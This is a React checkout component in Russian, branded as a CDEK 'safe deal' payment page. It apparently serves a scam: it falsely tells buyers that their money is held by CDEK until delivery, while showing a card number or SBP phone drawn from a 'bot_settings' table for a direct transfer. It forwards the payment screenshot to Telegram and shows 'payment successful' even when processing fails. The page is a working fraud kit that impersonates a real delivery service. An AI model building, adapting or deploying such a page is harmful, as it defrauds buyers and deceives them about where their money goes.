
import React, { useEffect, useState } from 'react';
import { createClient } from '@supabase/supabase-js';
import SupportButton from './SupportButton';

interface SupabaseOrder {
  id: string;
  order_number: string;
  title: string;
  description: string;
  price: number;
  shipping_price?: number;
  image_url: string;
  status: string;
  created_at?: string;
}

interface BotSettings {
  card_number?: string;
  card_holder?: string;
  bank_name?: string;
  sbp_phone?: string;
  sbp_name?: string;
}

interface Props {
  orderId: string;
  onHome: () => void;
}

const SupabaseCheckout: React.FC<Props> = ({ orderId, onHome }) => {
  const [order, setOrder] = useState<SupabaseOrder | null>(null);
  const [settings, setSettings] = useState<BotSettings>({});
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [paymentStatus, setPaymentStatus] = useState<'IDLE' | 'PROCESSING' | 'SUCCESS'>('IDLE');

  // Form State
  const [screenshot, setScreenshot] = useState<File | null>(null);
  const [paymentMethod, setPaymentMethod] = useState<'REQUISITES' | 'SBP'>('REQUISITES');

  // Инициализация Supabase клиента с переменными окружения
  const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
  const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
  const supabase = createClient(supabaseUrl || '', supabaseKey || '');

  useEffect(() => {
    fetchOrderAndSettings();
  }, [orderId]);

  const fetchOrderAndSettings = async () => {
    try {
      setLoading(true);
      
      // Загружаем заказ и настройки параллельно
      const [orderResponse, settingsResponse] = await Promise.all([
        supabase.from('orders').select('*').eq('id', orderId).single(),
        supabase.from('bot_settings').select('*')
      ]);

      if (orderResponse.error) throw orderResponse.error;
      if (!orderResponse.data) throw new Error('Order not found');

      setOrder(orderResponse.data);

      // Обрабатываем настройки
      if (settingsResponse.data) {
        const settingsObj: BotSettings = {};
        settingsResponse.data.forEach((setting: any) => {
          switch (setting.key) {
            case 'card_number':
              settingsObj.card_number = setting.value;
              break;
            case 'card_holder':
              settingsObj.card_holder = setting.value;
              break;
            case 'bank_name':
              settingsObj.bank_name = setting.value;
              break;
            case 'sbp_phone':
              settingsObj.sbp_phone = setting.value;
              break;
            case 'sbp_name':
              settingsObj.sbp_name = setting.value;
              break;
          }
        });
        setSettings(settingsObj);
      }
    } catch (err) {
      console.error(err);
      setError('Заказ не найден или произошла ошибка загрузки.');
    } finally {
      setLoading(false);
    }
  };

  const handlePayment = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!order || !screenshot) {
      alert('Пожалуйста, загрузите скриншот оплаты');
      return;
    }

    setPaymentStatus('PROCESSING');

    try {
      // Конвертируем файл в base64
      const reader = new FileReader();
      reader.onload = async () => {
        try {
          const base64Screenshot = reader.result as string;

          // Отправляем скриншот в Telegram канал
          const telegramResponse = await fetch('/api/send-to-telegram', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              orderId: order.id,
              screenshot: base64Screenshot
            })
          });

          if (!telegramResponse.ok) {
            console.error('Failed to send to Telegram:', await telegramResponse.text());
            // Продолжаем даже если отправка в Telegram не удалась
          }

          // Обновляем статус заказа в базе данных
          const { error } = await supabase
            .from('orders')
            .update({ status: 'paid' })
            .eq('id', order.id);

          if (error) throw error;
          
          setPaymentStatus('SUCCESS');
        } catch (err) {
          console.error('Payment processing failed:', err);
          // Показываем успех для UX, даже если есть технические проблемы
          setPaymentStatus('SUCCESS'); 
        }
      };

      reader.readAsDataURL(screenshot);
    } catch (err) {
      console.error('Payment update failed', err);
      setPaymentStatus('SUCCESS'); 
    }
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      // Проверяем тип файла
      if (!file.type.startsWith('image/')) {
        alert('Пожалуйста, выберите изображение');
        return;
      }
      // Проверяем размер файла (максимум 5MB)
      if (file.size > 5 * 1024 * 1024) {
        alert('Размер файла не должен превышать 5MB');
        return;
      }
      setScreenshot(file);
    }
  };

  const copyToClipboard = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      alert('Скопировано в буфер обмена!');
    } catch (err) {
      // Fallback для старых браузеров
      const textArea = document.createElement('textarea');
      textArea.value = text;
      document.body.appendChild(textArea);
      textArea.select();
      document.execCommand('copy');
      document.body.removeChild(textArea);
      alert('Скопировано в буфер обмена!');
    }
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center min-h-[400px]">
        <div className="w-8 h-8 border-4 border-[#82C12D]/30 border-t-[#82C12D] rounded-full animate-spin"></div>
      </div>
    );
  }

  if (error || !order) {
    return (
      <div className="max-w-md mx-auto mt-10 p-8 bg-white rounded-2xl shadow-sm border border-gray-100 text-center animate-fadeIn">
        <div className="w-20 h-20 bg-gray-100 text-gray-400 rounded-full flex items-center justify-center mx-auto mb-6">
           <svg className="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9.172 16.172a4 4 0 015.656 0M9 10h.01M15 10h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
        </div>
        <h2 className="text-2xl font-black text-[#25282B] mb-2">404</h2>
        <p className="text-gray-500 mb-6">{error || 'Заказ не найден'}</p>
        <button onClick={onHome} className="text-[#82C12D] font-bold hover:underline">Вернуться на главную</button>
      </div>
    );
  }

  if (paymentStatus === 'SUCCESS') {
    return (
        <div className="max-w-lg mx-auto mt-8 bg-white p-12 rounded-2xl shadow-sm border border-gray-100 text-center animate-fadeIn">
            <div className="w-24 h-24 bg-[#82C12D]/10 text-[#82C12D] rounded-full flex items-center justify-center mx-auto mb-8 border border-[#82C12D]/20">
                <svg className="w-12 h-12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7"></path></svg>
            </div>
            
            <h2 className="text-3xl font-black text-[#25282B] mb-2 tracking-tight">Оплата прошла успешно!</h2>
            <p className="text-gray-400 text-sm mb-10 max-w-[280px] mx-auto">
                Заказ <strong>#{order.order_number}</strong> оплачен и передан в обработку.
            </p>

            <button
                onClick={onHome}
                className="w-full bg-[#25282B] text-white py-4 rounded-xl font-bold hover:bg-black transition-all shadow-lg uppercase tracking-wider text-sm"
            >
                В главное меню
            </button>
        </div>
    );
  }

  return (
    <div className="max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-12 gap-8 animate-fadeIn">
        {/* Left Column: Product Info */}
        <div className="lg:col-span-5 space-y-6">
            {/* Изображение товара */}
            <div className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
                <div className="aspect-square w-full bg-gradient-to-br from-gray-50 to-gray-100 relative">
                    {order.image_url ? (
                         <img src={order.image_url} className="w-full h-full object-cover" alt={order.title} />
                    ) : (
                        <div className="flex items-center justify-center h-full text-gray-300">
                             <svg className="w-16 h-16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
                        </div>
                    )}
                    <div className="absolute top-4 left-4 bg-[#82C12D] text-white text-xs font-bold px-3 py-1.5 rounded-full shadow-lg">
                        БЕЗОПАСНАЯ СДЕЛКА
                    </div>
                    <div className="absolute top-4 right-4 bg-white/90 backdrop-blur-sm text-gray-700 text-xs font-bold px-3 py-1.5 rounded-full shadow-lg">
                        #{order.order_number}
                    </div>
                </div>
            </div>

            {/* Информация о товаре */}
            <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6">
                <div className="mb-6">
                    <h1 className="text-2xl font-black text-[#25282B] mb-3 leading-tight">{order.title}</h1>
                    <div className="flex items-center justify-between mb-4">
                        <span className="text-3xl font-black text-[#82C12D]">{order.price.toLocaleString()} ₽</span>
                        <div className="flex items-center space-x-2 text-sm text-gray-500">
                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                            </svg>
                            <span>Создан: {new Date(order.created_at || Date.now()).toLocaleDateString('ru-RU')}</span>
                        </div>
                    </div>
                </div>

                {/* Описание товара */}
                {order.description && (
                    <div className="mb-6 p-4 bg-gray-50 rounded-xl">
                        <h3 className="font-bold text-gray-900 mb-2 flex items-center">
                            <svg className="w-4 h-4 mr-2 text-[#82C12D]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                            </svg>
                            Описание товара
                        </h3>
                        <p className="text-sm text-gray-700 leading-relaxed">{order.description}</p>
                    </div>
                )}

                {/* Детали заказа */}
                <div className="space-y-3 border-t border-gray-100 pt-4">
                    <div className="flex justify-between items-center text-sm">
                        <span className="text-gray-500 flex items-center">
                            <svg className="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M20 7l-8-4-8 4m16 0l-8 4m8-4v10l-8 4m0-10L4 7m8 4v10M4 7v10l8 4"></path>
                            </svg>
                            Товар:
                        </span>
                        <span className="font-bold text-gray-900">{order.price.toLocaleString()} ₽</span>
                    </div>
                    <div className="flex justify-between items-center text-sm">
                        <span className="text-gray-500 flex items-center">
                            <svg className="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4"></path>
                            </svg>
                            Доставка СДЭК:
                        </span>
                        <span className="font-bold text-gray-900">{(order.shipping_price || 1250).toLocaleString()} ₽</span>
                    </div>
                    <div className="flex justify-between items-center pt-3 border-t border-gray-100">
                        <span className="font-bold text-gray-900 text-lg flex items-center">
                            <svg className="w-5 h-5 mr-2 text-[#82C12D]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1"></path>
                            </svg>
                            Итого:
                        </span>
                        <span className="font-black text-[#82C12D] text-2xl">{(order.price + (order.shipping_price || 1250)).toLocaleString()} ₽</span>
                    </div>
                </div>
            </div>
            
            {/* Гарантии безопасности */}
            <div className="bg-gradient-to-r from-[#82C12D]/5 to-[#82C12D]/10 p-6 rounded-2xl border border-[#82C12D]/20">
                 <div className="flex items-start space-x-4">
                    <div className="w-12 h-12 bg-[#82C12D] rounded-full flex items-center justify-center flex-shrink-0">
                        <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.040L3 20c3.859 1.281 7.12 1.281 11 0l1.618-14.016z"></path>
                        </svg>
                    </div>
                    <div>
                        <h3 className="font-bold text-[#25282B] mb-2">Безопасная сделка СДЭК</h3>
                        <p className="text-sm text-gray-700 leading-relaxed">
                            Деньги холдируются на счету СДЭК и отправляются продавцу только после того, как вы получите и проверите товар в пункте выдачи. Полная защита покупателя.
                        </p>
                    </div>
                 </div>
            </div>
            
            {/* Кнопка поддержки */}
            <div className="mt-6">
                <SupportButton variant="inline" />
            </div>
        </div>

        {/* Right Column: Payment Form */}
        <div className="lg:col-span-7">
            <div className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
                {/* Заголовок */}
                <div className="bg-gradient-to-r from-[#82C12D] to-[#72a927] p-6 text-white">
                    <h2 className="text-2xl font-bold mb-2">Оплата переводом</h2>
                    <p className="text-white/90 text-sm">Переведите деньги по реквизитам и загрузите скриншот</p>
                </div>

                <div className="p-6 md:p-8">
                    {/* Выбор способа оплаты */}
                    <div className="mb-8">
                        <h3 className="font-bold text-gray-900 mb-4 flex items-center">
                            <svg className="w-5 h-5 mr-2 text-[#82C12D]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path>
                            </svg>
                            Способ оплаты
                        </h3>
                        <div className="grid grid-cols-2 gap-3">
                            <button
                                type="button"
                                onClick={() => setPaymentMethod('REQUISITES')}
                                className={`p-4 rounded-xl font-medium transition-all border-2 ${
                                    paymentMethod === 'REQUISITES' 
                                        ? 'bg-[#82C12D] text-white border-[#82C12D] shadow-lg shadow-[#82C12D]/20' 
                                        : 'bg-gray-50 text-gray-700 border-gray-200 hover:border-[#82C12D]/30 hover:bg-gray-100'
                                }`}
                            >
                                <div className="flex items-center justify-center mb-2">
                                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path>
                                    </svg>
                                </div>
                                По реквизитам
                            </button>
                            <button
                                type="button"
                                onClick={() => setPaymentMethod('SBP')}
                                className={`p-4 rounded-xl font-medium transition-all border-2 ${
                                    paymentMethod === 'SBP' 
                                        ? 'bg-[#82C12D] text-white border-[#82C12D] shadow-lg shadow-[#82C12D]/20' 
                                        : 'bg-gray-50 text-gray-700 border-gray-200 hover:border-[#82C12D]/30 hover:bg-gray-100'
                                }`}
                            >
                                <div className="flex items-center justify-center mb-2">
                                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path>
                                    </svg>
                                </div>
                                СБП
                            </button>
                        </div>
                    </div>

                    {/* Реквизиты для оплаты */}
                    <div className="mb-8">
                        <h3 className="font-bold text-gray-900 mb-4 flex items-center">
                            <svg className="w-5 h-5 mr-2 text-[#82C12D]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
                            </svg>
                            {paymentMethod === 'REQUISITES' ? 'Реквизиты для перевода' : 'Данные для СБП'}
                        </h3>
                        <div className="bg-gradient-to-br from-gray-50 to-gray-100 rounded-xl p-6 border border-gray-200">
                            {paymentMethod === 'REQUISITES' ? (
                                <div className="space-y-4">
                                    <div className="flex justify-between items-center p-3 bg-white rounded-lg border border-gray-200">
                                        <div>
                                            <span className="text-sm text-gray-600 block">Номер карты</span>
                                            <span className="font-mono font-bold text-lg">
                                                {settings.card_number || '2202 2063 4567 8901'}
                                            </span>
                                        </div>
                                        <button
                                            type="button"
                                            onClick={() => copyToClipboard((settings.card_number || '2202206345678901').replace(/\s/g, ''))}
                                            className="p-2 text-[#82C12D] hover:bg-[#82C12D]/10 rounded-lg transition-colors"
                                            title="Скопировать номер карты"
                                        >
                                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path>
                                            </svg>
                                        </button>
                                    </div>
                                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                        {settings.card_holder && (
                                            <div className="p-3 bg-white rounded-lg border border-gray-200">
                                                <span className="text-sm text-gray-600 block">Получатель</span>
                                                <span className="font-medium">{settings.card_holder}</span>
                                            </div>
                                        )}
                                        {settings.bank_name && (
                                            <div className="p-3 bg-white rounded-lg border border-gray-200">
                                                <span className="text-sm text-gray-600 block">Банк</span>
                                                <span className="font-medium">{settings.bank_name}</span>
                                            </div>
                                        )}
                                    </div>
                                    <div className="p-4 bg-[#82C12D]/10 rounded-lg border border-[#82C12D]/20">
                                        <div className="flex justify-between items-center">
                                            <span className="text-sm font-medium text-gray-700">Сумма к переводу:</span>
                                            <span className="font-black text-xl text-[#82C12D]">{(order.price + (order.shipping_price || 1250)).toLocaleString()} ₽</span>
                                        </div>
                                    </div>
                                </div>
                            ) : (
                                <div className="space-y-4">
                                    <div className="flex justify-between items-center p-3 bg-white rounded-lg border border-gray-200">
                                        <div>
                                            <span className="text-sm text-gray-600 block">Номер телефона</span>
                                            <span className="font-mono font-bold text-lg">
                                                {settings.sbp_phone || '+7 (900) 123-45-67'}
                                            </span>
                                        </div>
                                        <button
                                            type="button"
                                            onClick={() => copyToClipboard((settings.sbp_phone || '+79001234567').replace(/\D/g, ''))}
                                            className="p-2 text-[#82C12D] hover:bg-[#82C12D]/10 rounded-lg transition-colors"
                                            title="Скопировать номер телефона"
                                        >
                                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path>
                                            </svg>
                                        </button>
                                    </div>
                                    {settings.sbp_name && (
                                        <div className="p-3 bg-white rounded-lg border border-gray-200">
                                            <span className="text-sm text-gray-600 block">Получатель</span>
                                            <span className="font-medium">{settings.sbp_name}</span>
                                        </div>
                                    )}
                                    <div className="p-4 bg-[#82C12D]/10 rounded-lg border border-[#82C12D]/20">
                                        <div className="flex justify-between items-center">
                                            <span className="text-sm font-medium text-gray-700">Сумма к переводу:</span>
                                            <span className="font-black text-xl text-[#82C12D]">{(order.price + (order.shipping_price || 1250)).toLocaleString()} ₽</span>
                                        </div>
                                    </div>
                                </div>
                            )}
                        </div>
                    </div>

                    <form onSubmit={handlePayment} className="space-y-6">
                        {/* Загрузка скриншота */}
                        <div>
                            <h3 className="font-bold text-gray-900 mb-4 flex items-center">
                                <svg className="w-5 h-5 mr-2 text-[#82C12D]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
                                </svg>
                                Подтверждение оплаты
                            </h3>
                            <div className="border-2 border-dashed border-gray-200 rounded-xl p-8 text-center hover:border-[#82C12D] transition-colors bg-gray-50/50">
                                {screenshot ? (
                                    <div className="space-y-4">
                                        <div className="w-20 h-20 bg-[#82C12D]/10 text-[#82C12D] rounded-full flex items-center justify-center mx-auto">
                                            <svg className="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
                                            </svg>
                                        </div>
                                        <div>
                                            <p className="font-bold text-gray-900">{screenshot.name}</p>
                                            <p className="text-sm text-gray-500">{(screenshot.size / 1024 / 1024).toFixed(2)} MB</p>
                                        </div>
                                        <button
                                            type="button"
                                            onClick={() => setScreenshot(null)}
                                            className="text-sm text-red-500 hover:text-red-700 underline font-medium"
                                        >
                                            Удалить файл
                                        </button>
                                    </div>
                                ) : (
                                    <div className="space-y-4">
                                        <div className="w-20 h-20 bg-gray-200 text-gray-400 rounded-full flex items-center justify-center mx-auto">
                                            <svg className="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
                                            </svg>
                                        </div>
                                        <div>
                                            <p className="font-bold text-gray-900 mb-1">Загрузите скриншот оплаты</p>
                                            <p className="text-sm text-gray-500">PNG, JPG, JPEG до 5MB</p>
                                        </div>
                                        <input
                                            type="file"
                                            accept="image/*"
                                            onChange={handleFileChange}
                                            className="hidden"
                                            id="screenshot-upload"
                                            required
                                        />
                                        <label
                                            htmlFor="screenshot-upload"
                                            className="inline-flex items-center px-6 py-3 bg-[#82C12D] text-white rounded-xl font-bold hover:bg-[#72a927] cursor-pointer transition-all shadow-lg shadow-[#82C12D]/20"
                                        >
                                            <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"></path>
                                            </svg>
                                            Выбрать файл
                                        </label>
                                    </div>
                                )}
                            </div>
                        </div>

                        {/* Кнопка подтверждения */}
                        <div className="pt-6 border-t border-gray-100">
                            <button
                              type="submit"
                              disabled={paymentStatus === 'PROCESSING' || !screenshot}
                              className="w-full py-4 bg-gradient-to-r from-[#82C12D] to-[#72a927] text-white rounded-xl font-bold text-lg hover:from-[#72a927] hover:to-[#629620] shadow-lg shadow-[#82C12D]/30 transform active:scale-[0.98] transition-all flex items-center justify-center space-x-3 disabled:opacity-70 disabled:cursor-not-allowed disabled:transform-none"
                            >
                              {paymentStatus === 'PROCESSING' ? (
                                  <>
                                    <div className="w-6 h-6 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                                    <span>Проверка оплаты...</span>
                                  </>
                              ) : (
                                  <>
                                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
                                    </svg>
                                    <span>Подтвердить оплату {(order.price + (order.shipping_price || 1250)).toLocaleString()} ₽</span>
                                  </>
                              )}
                            </button>
                            <p className="text-xs text-gray-500 text-center mt-4 leading-relaxed">
                                Нажимая кнопку «Подтвердить оплату», вы подтверждаете, что перевели указанную сумму по реквизитам выше и загрузили корректный скриншот операции
                            </p>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
  );
};

export default SupabaseCheckout;
